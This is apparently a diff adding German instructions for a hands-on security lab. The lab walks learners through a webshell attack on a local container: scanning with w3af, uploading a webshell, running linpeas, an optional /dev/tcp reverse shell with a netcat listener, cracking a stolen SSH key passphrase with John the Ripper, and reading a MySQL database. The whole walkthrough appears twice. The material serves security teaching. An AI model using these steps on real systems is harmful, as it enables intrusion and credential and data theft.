@@ -1,0 +1,288 @@
+<h3 id="webshell-angriff">Webshell-Angriff</h3>
+<ol type="1">
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>Loggen Sie sich in den w3af Container und führen Sie das Skript
+<strong>w3af_console</strong> aus, indem Sie folgenden Befehl</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./w3af_console</span></span></code></pre></div>
+<p>im Terminal ausführen.</p>
+<p>Mit dem Befehl</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">help</span> <span class="pp">[</span><span class="ss">Option</span><span class="pp">]</span></span></code></pre></div>
+<p>werden Ihnen die verschiedenen Befehle und deren Beschreibung von
+w3af angezeigt. Die drei Befehle, die Sie in dieser Übung verwenden
+werden sind <strong>Plug-Ins</strong>, <strong>target</strong> und
+<strong>start</strong>.</p>
+<p>Geben Sie <strong>Plug-Ins</strong> in das Terminal ein, Sie sollten
+nun in der Plug-Ins Oberfläche sein. Mit einer weiteren Eingabe von
+<strong>help</strong> werden Ihnen die verschieden Scanmodule angezeigt.
+Aktivieren Sie die Module <strong>web_spider</strong> und
+<strong>file_upload</strong>, in dem Sie die Befehle</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">crawl</span> web_spider</span></code></pre></div>
+<p>und</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> file_upload</span></code></pre></div>
+<p>nacheinander ausführen.</p>
+<p>Mit <strong>back</strong> gelangen Sie wieder in die vorherige
+Oberfläche.</p>
+<p>Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als
+Ihr Ziel.</p>
+<p>Dafür müssen Sie den Befehl <strong>target</strong> eingeben, gefolgt
+von dem Befehl</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> target http://<span class="op">&lt;</span>local_ip_adresse<span class="op">&gt;</span>:8080</span></code></pre></div>
+<p>Mit der Eingabe von <strong>view</strong> lassen sich die Ziele
+einsehen.</p>
+<p>Kehren Sie wieder in die ursprüngliche Oberfläche zurück
+(<strong>back</strong>) und starten Sie den Scan über den Befehl
+<strong>start.</strong></p>
+<p>Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen:</p>
+<ul>
+<li>Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;</li>
+<li>Welche URLs existieren für die Ziel Webanwendung und wo werden
+eventuell von dem/der Benutzer/-in hochgeladene Dateien
+abgespeichert</li>
+</ul>
+<p>beantworten.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>Laden Sie die Webshell (webshell.php) über die Upload Funktion der
+Webseite auf den Webserver und öffnen Sie das Skript über den Browser,
+indem Sie in der Suchleiste die URL</p>
+<pre><code>[localhost:8080](http://localhost:8080)/[storage_path]/[file_name] </code></pre>
+<p>eingeben. Das Passwort um für die Autorisierung der Webshell ist:
+“<strong>j<sub>82BQC;3N&lt;`HK</sub></strong>”.</p>
+<p>Sammeln Sie Informationen über den Server, indem Sie die oben
+genannten <strong>Unix Befehle</strong> verwenden um sich durch das
+Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im
+Abschnitt <strong>Server Seite,</strong> unter <strong>Allgemeines /
+Angriff,</strong> des Dateisystems oben beschrieben.</p>
+<p>Um die Informationssuche zu automatisieren können Sie das Skript
+<strong>linpeas.sh</strong> hochladen und ausführen. Sie können das
+Skript auch über die Webseite hochladen oder die Upload-Funktion der
+Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben
+Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden
+zum ausführen des Skriptes.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> ./linpeas.sh</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">💡</span> Optional <span class="at">-</span> Reverse Shell: </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Loggen</span> Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname <span class="at">-i</span> ausgeben. </span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Anschließend</span> können Sie den Befehl nc <span class="at">-lnvp</span> <span class="pp">[</span><span class="ss">port</span><span class="pp">]</span> ausführen. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. </span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Sende</span> Senden Sie den Befehl </span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-c</span> <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/[client_ip]/[port] 0&gt;&amp;1&quot;</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="ex">über</span> die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und übergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal.  </span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Im</span> Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden </span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="ex">sein.</span> Nun können Sie statt im Browser über eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausführung auf der Reverse Shell </span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="ex">koloriert</span> bzw. formatiert angezeigt.</span></code></pre></div>
+<p>linpeas.sh gibt Ihnen interessante Informationen, wie
+Systeminformationen, gefundene Dateien von Relevanz und andere nützliche
+Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in
+einem Terminal ausgeben lassen).</p>
+<p>Suchen Sie in der Ausgabe nach Authentifizierungsinformation für die
+Datenbank und Schlüssel für eine SSH Verbindung.</p>
+<p>Lokalisieren Sie das SSH Verzeichnis, des Eigentümers der Schlüssel
+und überprüfen Sie die Rechte der Dateien. Kopieren Sie sich den
+privaten Schlüssel</p>
+<p>Öffnen Sie im Kali Linux Container ein Terminal um eine SSH
+Verbindung zum Webserver herzustellen.</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="op">&lt;</span>username<span class="op">&gt;</span>@<span class="op">&lt;</span>webserver_ip_adress<span class="op">&gt;</span></span></code></pre></div>
+<p>Die SSH Verbindung scheint passwortgeschützt zu sein.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>In diesem Schritt werden Sie das Passwort des privaten Schlüssels
+knacken.</p>
+<p>Erstellen Sie dafür eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali
+Linux Container und fügen Sie den vom Webserver kopierten Schlüssel in
+die erstellte Datei ein. Navigieren Sie hierfür in das
+Homeverzeichnis.</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home <span class="kw">&amp;&amp;</span> <span class="fu">nano</span> <span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa</span></code></pre></div>
+<p>Das Programm John The Ripper kann die Schlüsseldatei nicht direkt
+verarbeiten. Deshalb muss der Schlüssel zuerst in einen Hash umgewandelt
+werden, den John The Ripper interpretieren kann.</p>
+<p>Nutzen Sie dafür ssh2john.py. Mit dem Befehl</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> ssh2john.py [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa] <span class="op">&gt;</span> [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.hash] </span></code></pre></div>
+<p>wird eine Datei, welche einen kryptografisch verschlüsselten
+Schlüssel enthält, in einen Hash umgewandelt und in die zweite Datei
+geschrieben.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt <span class="pp">[</span><span class="ss">hash_file</span><span class="pp">]</span></span></code></pre></div>
+<p>Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut
+sich über SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung
+sehen Sie das Terminal des Webservers.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>In letzten Schritt der Angreifer/-innen Perspektive werden Sie
+versuchen Daten aus der Datenbank zu lesen.</p>
+<p>Verbinden Sie sich mit der Datenbank, indem Sie die
+Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl
+einfügen und ausführen.</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-u</span> <span class="pp">[</span><span class="ss">username</span><span class="pp">]</span> <span class="at">-p</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">host_name</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">database_name</span><span class="pp">]</span></span></code></pre></div>
+<p>Geben Sie das Passwort bei der Aufforderung ein und bestätigen Sie
+dies mit der Enter-Taste.</p>
+<p>Nützliche SQL-Befehle:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>SHOW <span class="kw">TABLES</span>;</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> [database_name].[table_name];</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Die Funktionen ST_X(position) und ST_Y(position) <span class="op">..</span>. wandelt das Attribut  </span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> <span class="ot">&quot;position&quot;</span> <span class="kw">in</span> latitude und longitude (Koordinaten) um</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> z.B. <span class="kw">SELECT</span> ST_X(position), ST_Y(position) <span class="kw">FROM</span> [table_name]</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Weitere Abfragen finden Sie <span class="kw">in</span> den Dateien, <span class="kw">in</span> dem die </span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Authentifizierungsinformation gefunden wurden.</span></code></pre></div>
+<p>Mit <strong>exit</strong> verlassen Sie die MySQL Oberfläche
+wieder.</p></li>
+</ol>
+<h3 id="webshell-angriff-1">Webshell-Angriff</h3>
+<ol type="1">
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>Loggen Sie sich in den w3af Container und führen Sie das Skript
+<strong>w3af_console</strong> aus, indem Sie folgenden Befehl</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./w3af_console</span></span></code></pre></div>
+<p>im Terminal ausführen.</p>
+<p>Mit dem Befehl</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="bu">help</span> <span class="pp">[</span><span class="ss">Option</span><span class="pp">]</span></span></code></pre></div>
+<p>werden Ihnen die verschiedenen Befehle und deren Beschreibung von
+w3af angezeigt. Die drei Befehle, die Sie in dieser Übung verwenden
+werden sind <strong>Plug-Ins</strong>, <strong>target</strong> und
+<strong>start</strong>.</p>
+<p>Geben Sie <strong>Plug-Ins</strong> in das Terminal ein, Sie sollten
+nun in der Plug-Ins Oberfläche sein. Mit einer weiteren Eingabe von
+<strong>help</strong> werden Ihnen die verschieden Scanmodule angezeigt.
+Aktivieren Sie die Module <strong>web_spider</strong> und
+<strong>file_upload</strong>, in dem Sie die Befehle</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">crawl</span> web_spider</span></code></pre></div>
+<p>und</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> file_upload</span></code></pre></div>
+<p>nacheinander ausführen.</p>
+<p>Mit <strong>back</strong> gelangen Sie wieder in die vorherige
+Oberfläche.</p>
+<p>Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als
+Ihr Ziel.</p>
+<p>Dafür müssen Sie den Befehl <strong>target</strong> eingeben, gefolgt
+von dem Befehl</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> target http://<span class="op">&lt;</span>local_ip_adresse<span class="op">&gt;</span>:8080</span></code></pre></div>
+<p>Mit der Eingabe von <strong>view</strong> lassen sich die Ziele
+einsehen.</p>
+<p>Kehren Sie wieder in die ursprüngliche Oberfläche zurück
+(<strong>back</strong>) und starten Sie den Scan über den Befehl
+<strong>start.</strong></p>
+<p>Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen:</p>
+<ul>
+<li>Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;</li>
+<li>Welche URLs existieren für die Ziel Webanwendung und wo werden
+eventuell von dem/der Benutzer/-in hochgeladene Dateien
+abgespeichert</li>
+</ul>
+<p>beantworten.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>Laden Sie die Webshell (webshell.php) über die Upload Funktion der
+Webseite auf den Webserver und öffnen Sie das Skript über den Browser,
+indem Sie in der Suchleiste die URL</p>
+<pre><code>[localhost:8080](http://localhost:8080)/[storage_path]/[file_name] </code></pre>
+<p>eingeben. Das Passwort um für die Autorisierung der Webshell ist:
+“<strong>j<sub>82BQC;3N&lt;`HK</sub></strong>”.</p>
+<p>Sammeln Sie Informationen über den Server, indem Sie die oben
+genannten <strong>Unix Befehle</strong> verwenden um sich durch das
+Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im
+Abschnitt <strong>Server Seite,</strong> unter <strong>Allgemeines /
+Angriff,</strong> des Dateisystems oben beschrieben.</p>
+<p>Um die Informationssuche zu automatisieren können Sie das Skript
+<strong>linpeas.sh</strong> hochladen und ausführen. Sie können das
+Skript auch über die Webseite hochladen oder die Upload-Funktion der
+Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben
+Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden
+zum ausführen des Skriptes.</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> ./linpeas.sh</span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">💡</span> Optional <span class="at">-</span> Reverse Shell: </span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Loggen</span> Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname <span class="at">-i</span> ausgeben. </span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Anschließend</span> können Sie den Befehl nc <span class="at">-lnvp</span> <span class="pp">[</span><span class="ss">port</span><span class="pp">]</span> ausführen. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. </span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Sende</span> Senden Sie den Befehl </span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-c</span> <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/[client_ip]/[port] 0&gt;&amp;1&quot;</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">über</span> die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und übergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal.  </span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Im</span> Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden </span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="ex">sein.</span> Nun können Sie statt im Browser über eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausführung auf der Reverse Shell </span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="ex">koloriert</span> bzw. formatiert angezeigt.</span></code></pre></div>
+<p>linpeas.sh gibt Ihnen interessante Informationen, wie
+Systeminformationen, gefundene Dateien von Relevanz und andere nützliche
+Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in
+einem Terminal ausgeben lassen).</p>
+<p>Suchen Sie in der Ausgabe nach Authentifizierungsinformation für die
+Datenbank und Schlüssel für eine SSH Verbindung.</p>
+<p>Lokalisieren Sie das SSH Verzeichnis, des Eigentümers der Schlüssel
+und überprüfen Sie die Rechte der Dateien. Kopieren Sie sich den
+privaten Schlüssel</p>
+<p>Öffnen Sie im Kali Linux Container ein Terminal um eine SSH
+Verbindung zum Webserver herzustellen.</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="op">&lt;</span>username<span class="op">&gt;</span>@<span class="op">&lt;</span>webserver_ip_adress<span class="op">&gt;</span></span></code></pre></div>
+<p>Die SSH Verbindung scheint passwortgeschützt zu sein.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>In diesem Schritt werden Sie das Passwort des privaten Schlüssels
+knacken.</p>
+<p>Erstellen Sie dafür eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali
+Linux Container und fügen Sie den vom Webserver kopierten Schlüssel in
+die erstellte Datei ein. Navigieren Sie hierfür in das
+Homeverzeichnis.</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home <span class="kw">&amp;&amp;</span> <span class="fu">nano</span> <span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa</span></code></pre></div>
+<p>Das Programm John The Ripper kann die Schlüsseldatei nicht direkt
+verarbeiten. Deshalb muss der Schlüssel zuerst in einen Hash umgewandelt
+werden, den John The Ripper interpretieren kann.</p>
+<p>Nutzen Sie dafür ssh2john.py. Mit dem Befehl</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> ssh2john.py [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa] <span class="op">&gt;</span> [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.hash] </span></code></pre></div>
+<p>wird eine Datei, welche einen kryptografisch verschlüsselten
+Schlüssel enthält, in einen Hash umgewandelt und in die zweite Datei
+geschrieben.</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt <span class="pp">[</span><span class="ss">hash_file</span><span class="pp">]</span></span></code></pre></div>
+<p>Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut
+sich über SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung
+sehen Sie das Terminal des Webservers.</p></li>
+<li><p><strong>Schritt:</strong> 😈 <strong>(Perspektive:
+Angreifer/-in)</strong></p>
+<p>In letzten Schritt der Angreifer/-innen Perspektive werden Sie
+versuchen Daten aus der Datenbank zu lesen.</p>
+<p>Verbinden Sie sich mit der Datenbank, indem Sie die
+Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl
+einfügen und ausführen.</p>
+<div class="sourceCode" id="cb27"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-u</span> <span class="pp">[</span><span class="ss">username</span><span class="pp">]</span> <span class="at">-p</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">host_name</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">database_name</span><span class="pp">]</span></span></code></pre></div>
+<p>Geben Sie das Passwort bei der Aufforderung ein und bestätigen Sie
+dies mit der Enter-Taste.</p>
+<p>Nützliche SQL-Befehle:</p>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>SHOW <span class="kw">TABLES</span>;</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> [database_name].[table_name];</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Die Funktionen ST_X(position) und ST_Y(position) <span class="op">..</span>. wandelt das Attribut  </span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> <span class="ot">&quot;position&quot;</span> <span class="kw">in</span> latitude und longitude (Koordinaten) um</span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> z.B. <span class="kw">SELECT</span> ST_X(position), ST_Y(position) <span class="kw">FROM</span> [table_name]</span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Weitere Abfragen finden Sie <span class="kw">in</span> den Dateien, <span class="kw">in</span> dem die </span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Authentifizierungsinformation gefunden wurden.</span></code></pre></div>
+<p>Mit <strong>exit</strong> verlassen Sie die MySQL Oberfläche
+wieder.</p></li>
+</ol>
